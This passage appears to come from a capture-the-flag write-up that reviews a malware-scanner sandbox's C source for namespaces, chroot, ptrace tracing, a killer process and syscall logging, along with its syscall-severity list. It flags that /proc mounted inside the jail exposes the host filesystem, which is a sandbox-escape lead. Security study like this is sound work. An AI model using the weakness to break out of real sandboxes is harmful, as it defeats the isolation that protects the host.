    <span class="kt">char</span><span class="o">*</span> <span class="n">libs</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"libc.so.6"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
    <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="n">FILENAME_MAX</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="kt">char</span> <span class="n">outpath</span><span class="p">[</span><span class="n">FILENAME_MAX</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"mkdir -p bin usr/lib/x86_64-linux-gnu usr/lib64; cp /bin/sh bin"</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">libs</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">sprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">"/lib/x86_64-linux-gnu/%s"</span><span class="p">,</span> <span class="n">libs</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
        <span class="c1">// sprintf(path, "/lib/%s", libs[i]);</span>
        <span class="n">sprintf</span><span class="p">(</span><span class="n">outpath</span><span class="p">,</span> <span class="s">"./usr/lib/%s"</span><span class="p">,</span> <span class="n">libs</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
        <span class="n">copy</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">outpath</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">copy</span><span class="p">(</span><span class="s">"/lib64/ld-linux-x86-64.so.2"</span><span class="p">,</span> <span class="s">"./usr/lib64/ld-linux-x86-64.so.2"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"ln -s usr/lib64 lib64; ln -s usr/lib lib; chmod 755 -R usr bin"</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Inside copy the actual copying of the library happens.</p>

<p><code class="language-plaintext highlighter-rouge">copy.c</code></p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
</pre></td><td class="rouge-code"><pre><span class="c1">// https://stackoverflow.com/questions/2180079/how-can-i-copy-a-file-on-unix-using-c</span>
<span class="cp">#define _GNU_SOURCE
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="cm">/* On versions of glibc &lt; 2.27, need to use syscall.
 *
 * To determine glibc version used by gcc, compute an integer representing the
 * version. The strides are chosen to allow enough space for two-digit
 * minor version and patch level.
 *
 */</span>
<span class="cp">#define GCC_VERSION (__GNUC__*10000 + __GNUC_MINOR__*100 + __gnuc_patchlevel__)
#if GCC_VERSION &lt; 22700
</span><span class="k">static</span> <span class="n">loff_t</span> <span class="nf">copy_file_range</span><span class="p">(</span><span class="kt">int</span> <span class="n">in</span><span class="p">,</span> <span class="n">loff_t</span><span class="o">*</span> <span class="n">off_in</span><span class="p">,</span> <span class="kt">int</span> <span class="n">out</span><span class="p">,</span>
  <span class="n">loff_t</span><span class="o">*</span> <span class="n">off_out</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">s</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_copy_file_range</span><span class="p">,</span> <span class="n">in</span><span class="p">,</span> <span class="n">off_in</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="n">off_out</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span>
    <span class="n">flags</span><span class="p">);</span>
<span class="p">}</span>
<span class="cp">#endif
</span>
<span class="kt">int</span> <span class="nf">copy</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">src</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">dst</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">in</span><span class="p">,</span> <span class="n">out</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">stat</span> <span class="n">stat</span><span class="p">;</span>
    <span class="n">loff_t</span> <span class="n">s</span><span class="p">,</span> <span class="n">n</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">(</span><span class="n">in</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">))){</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"open(src, ...)"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="n">fstat</span><span class="p">(</span><span class="n">in</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">stat</span><span class="p">)){</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"fstat(in, ...)"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">stat</span><span class="p">.</span><span class="n">st_size</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">(</span><span class="n">out</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_WRONLY</span><span class="o">|</span><span class="n">O_TRUNC</span><span class="p">,</span> <span class="mo">0777</span><span class="p">))){</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"open(dst, ...)"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">do</span><span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">(</span><span class="n">n</span> <span class="o">=</span> <span class="n">copy_file_range</span><span class="p">(</span><span class="n">in</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">))){</span>
            <span class="n">perror</span><span class="p">(</span><span class="s">"copy_file_range(...)"</span><span class="p">);</span>
            <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="n">s</span><span class="o">-=</span><span class="n">n</span><span class="p">;</span>
    <span class="p">}</span><span class="k">while</span><span class="p">(</span><span class="mi">0</span><span class="o">&lt;</span><span class="n">s</span> <span class="o">&amp;&amp;</span> <span class="mi">0</span><span class="o">&lt;</span><span class="n">n</span><span class="p">);</span>
    <span class="n">close</span><span class="p">(</span><span class="n">in</span><span class="p">);</span>
    <span class="n">close</span><span class="p">(</span><span class="n">out</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Continuing with the execution flow in <code class="language-plaintext highlighter-rouge">make_jail</code>, <code class="language-plaintext highlighter-rouge">do_namespaces</code> is called next. This function creates a new namespace and unshares the pid and network space from the original namespace. Furthermore here a timer getâ€™s set for the parent to exit after 6 seconds. Afterwards a <code class="language-plaintext highlighter-rouge">/proc</code> dirctory is created in <code class="language-plaintext highlighter-rouge">./jails/[uuid]</code> and the actual <code class="language-plaintext highlighter-rouge">/proc</code> directory is mounted on top of it.</p>

<p><code class="language-plaintext highlighter-rouge">sandbox.c/do_namespaces</code></p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">do_namespaces</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">unshare</span><span class="p">(</span><span class="n">CLONE_NEWPID</span><span class="o">|</span><span class="n">CLONE_NEWNET</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="n">DIE</span><span class="p">(</span><span class="s">"Couldn't make namespaces"</span><span class="p">);};</span>
    <span class="c1">// Create pid-1</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fork</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span><span class="n">sleep</span><span class="p">(</span><span class="mi">6</span><span class="p">);</span> <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);}</span>
    <span class="n">mkdir</span><span class="p">(</span><span class="s">"./proc"</span><span class="p">,</span> <span class="mo">0555</span><span class="p">);</span>
    <span class="n">mount</span><span class="p">(</span><span class="s">"/proc"</span><span class="p">,</span> <span class="s">"./proc"</span><span class="p">,</span> <span class="s">"proc"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>After <code class="language-plaintext highlighter-rouge">do_namespaces</code> copy is called again to move the uploaded binary inside the chroot jail and the uidâ€™s are set to <code class="language-plaintext highlighter-rouge">1001</code>. Last up in <code class="language-plaintext highlighter-rouge">make_jail</code>, <code class="language-plaintext highlighter-rouge">do_trace</code> gets called. This function first drops the <code class="language-plaintext highlighter-rouge">effective</code> and <code class="language-plaintext highlighter-rouge">permitted</code> capabilities. Afterwards a child process is started which is killed after 5 seconds by another forked process which exits itself afterwards.</p>

<p><code class="language-plaintext highlighter-rouge">sandbox.c/do_trace</code></p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">do_trace</span><span class="p">()</span> <span class="p">{</span>
    <span class="c1">// We started with capabilities - we must reset the dumpable flag</span>
    <span class="c1">// so that the child can be traced</span>
    <span class="n">prctl</span><span class="p">(</span><span class="n">PR_SET_DUMPABLE</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="c1">// Remove dangerous capabilities before the child starts</span>
    <span class="k">struct</span> <span class="n">user_cap_header_struct</span> <span class="n">header</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">user_cap_data_struct</span> <span class="n">caps</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">pad</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
    <span class="n">header</span><span class="p">.</span><span class="n">version</span> <span class="o">=</span> <span class="n">_LINUX_CAPABILITY_VERSION_3</span><span class="p">;</span>
    <span class="n">header</span><span class="p">.</span><span class="n">pid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">caps</span><span class="p">.</span><span class="n">effective</span> <span class="o">=</span> <span class="n">caps</span><span class="p">.</span><span class="n">inheritable</span> <span class="o">=</span> <span class="n">caps</span><span class="p">.</span><span class="n">permitted</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">syscall</span><span class="p">(</span><span class="n">SYS_capget</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">header</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">caps</span><span class="p">);</span>
    <span class="n">caps</span><span class="p">.</span><span class="n">effective</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">caps</span><span class="p">.</span><span class="n">permitted</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">syscall</span><span class="p">(</span><span class="n">SYS_capset</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">header</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">caps</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">child</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">child</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">DIE</span><span class="p">(</span><span class="s">"Couldn't fork"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">child</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">do_child</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="kt">int</span> <span class="n">killer</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">killer</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">DIE</span><span class="p">(</span><span class="s">"Couldn't fork (2)"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">killer</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">do_killer</span><span class="p">(</span><span class="n">child</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">do_log</span><span class="p">(</span><span class="n">child</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Inside <code class="language-plaintext highlighter-rouge">do_child</code> the <code class="language-plaintext highlighter-rouge">jailsfd</code> is closed to lock the forked process inside <code class="language-plaintext highlighter-rouge">./jails/[uuid]</code>. The interesting thing here is though that <code class="language-plaintext highlighter-rouge">/proc</code> is mounted inside the chroot jail and still provides means of accessing the rest of the filesystem.</p>

<p><code class="language-plaintext highlighter-rouge">sandbox.c/do_child</code></p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">do_child</span><span class="p">()</span> <span class="p">{</span>
    <span class="c1">// Prevent child process from escaping chroot</span>
    <span class="n">close</span><span class="p">(</span><span class="n">jailsfd</span><span class="p">);</span>
    <span class="n">prctl</span><span class="p">(</span><span class="n">PR_SET_PDEATHSIG</span><span class="p">,</span> <span class="n">SIGHUP</span><span class="p">);</span>
    <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_TRACEME</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="kt">char</span><span class="o">*</span> <span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>
    <span class="n">execve</span><span class="p">(</span><span class="s">"/userprog"</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">DIE</span><span class="p">(</span><span class="s">"Couldn't execute user program"</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>After <code class="language-plaintext highlighter-rouge">do_child</code> a â€œkillerâ€ process is forked in <code class="language-plaintext highlighter-rouge">do_killer</code> which sleeps for 5 seconds, kills the <code class="language-plaintext highlighter-rouge">do_child</code> process and then exits.</p>

<p><code class="language-plaintext highlighter-rouge">sandbox.c/do_killer</code></p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">do_killer</span><span class="p">(</span><span class="kt">int</span> <span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">kill</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">SIGKILL</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span><span class="n">DIE</span><span class="p">(</span><span class="s">"Kill err"</span><span class="p">);}</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"Killed subprocess"</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>In <code class="language-plaintext highlighter-rouge">do_log</code> all the syscalls and their results are traced and passed to <code class="language-plaintext highlighter-rouge">log_syscall</code>.</p>

<p><code class="language-plaintext highlighter-rouge">sandbox.c/do_log</code></p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">do_log</span><span class="p">(</span><span class="kt">int</span> <span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">status</span><span class="p">;</span>
    <span class="n">waitpid</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">status</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">struct</span> <span class="n">user_regs_struct</span> <span class="n">regs</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">user_regs_struct</span> <span class="n">regs2</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// Enter syscall</span>
        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SYSCALL</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">waitpid</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">status</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">WIFEXITED</span><span class="p">(</span><span class="n">status</span><span class="p">)</span> <span class="o">||</span> <span class="n">WIFSIGNALED</span><span class="p">(</span><span class="n">status</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">puts</span><span class="p">(</span><span class="s">"Exited"</span><span class="p">);</span>
            <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_GETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">);</span>
        <span class="c1">// Continue syscall</span>
        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SYSCALL</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">waitpid</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">status</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_GETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs2</span><span class="p">);</span>
        <span class="n">log_syscall</span><span class="p">(</span><span class="n">regs</span><span class="p">,</span> <span class="n">regs2</span><span class="p">.</span><span class="n">rax</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="n">__packed__</span><span class="p">))</span> <span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">rax</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">rdi</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">rsi</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">rdx</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">r10</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">r8</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">r9</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span> <span class="n">registers</span><span class="p">;</span>

</pre></td></tr></tbody></table></code></div></div>

<p><code class="language-plaintext highlighter-rouge">log_syscall</code> now writes the traced syscalls to a log file <code class="language-plaintext highlighter-rouge">/log</code>.</p>

<p><code class="language-plaintext highlighter-rouge">sandbox.c/log_syscall</code></p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">log_syscall</span><span class="p">(</span><span class="k">struct</span> <span class="n">user_regs_struct</span> <span class="n">regs</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">ret</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">registers</span> <span class="n">result</span><span class="p">;</span>
    <span class="n">result</span><span class="p">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">regs</span><span class="p">.</span><span class="n">orig_rax</span><span class="p">;</span>
    <span class="n">result</span><span class="p">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">regs</span><span class="p">.</span><span class="n">rdi</span><span class="p">;</span>
    <span class="n">result</span><span class="p">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="n">regs</span><span class="p">.</span><span class="n">rsi</span><span class="p">;</span>
    <span class="n">result</span><span class="p">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="n">regs</span><span class="p">.</span><span class="n">rdx</span><span class="p">;</span>
    <span class="n">result</span><span class="p">.</span><span class="n">r10</span> <span class="o">=</span> <span class="n">regs</span><span class="p">.</span><span class="n">r10</span><span class="p">;</span>
    <span class="n">result</span><span class="p">.</span><span class="n">r8</span> <span class="o">=</span> <span class="n">regs</span><span class="p">.</span><span class="n">r8</span><span class="p">;</span>
    <span class="n">result</span><span class="p">.</span><span class="n">r9</span> <span class="o">=</span> <span class="n">regs</span><span class="p">.</span><span class="n">r9</span><span class="p">;</span>
    <span class="n">result</span><span class="p">.</span><span class="n">ret</span> <span class="o">=</span> <span class="n">ret</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/log"</span><span class="p">,</span> <span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_RDWR</span><span class="o">|</span><span class="n">O_APPEND</span><span class="p">,</span> <span class="mo">0777</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">result</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">registers</span><span class="p">));</span>
    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The log file now getâ€™s rendered on the <code class="language-plaintext highlighter-rouge">viewer</code> route in django. Looking at <code class="language-plaintext highlighter-rouge">malscanner/viewer/syscalls.py</code> we can see a list of supported syscalls.</p>

<p><code class="language-plaintext highlighter-rouge">malscanner/viewer/syscalls.py</code></p>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre></td><td class="rouge-code"><pre><span class="p">...[</span><span class="n">snip</span><span class="p">]...</span>

<span class="n">syscalls</span> <span class="o">=</span> <span class="p">[</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">Low</span><span class="p">,</span> <span class="s">"read"</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">Low</span><span class="p">,</span> <span class="s">"write"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">Medium</span><span class="p">,</span> <span class="s">"open"</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">Low</span><span class="p">,</span> <span class="s">"close"</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">1</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">Medium</span><span class="p">,</span> <span class="s">"stat"</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">2</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">Medium</span><span class="p">,</span> <span class="s">"fstat"</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">2</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">Medium</span><span class="p">,</span> <span class="s">"lstat"</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">2</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">Medium</span><span class="p">,</span> <span class="s">"access"</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">2</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">Low</span><span class="p">,</span> <span class="s">"alarm"</span><span class="p">,</span> <span class="mi">37</span><span class="p">,</span> <span class="mi">1</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">High</span><span class="p">,</span> <span class="s">"socket"</span><span class="p">,</span> <span class="mi">41</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">High</span><span class="p">,</span> <span class="s">"connect"</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">High</span><span class="p">,</span> <span class="s">"accept"</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span>
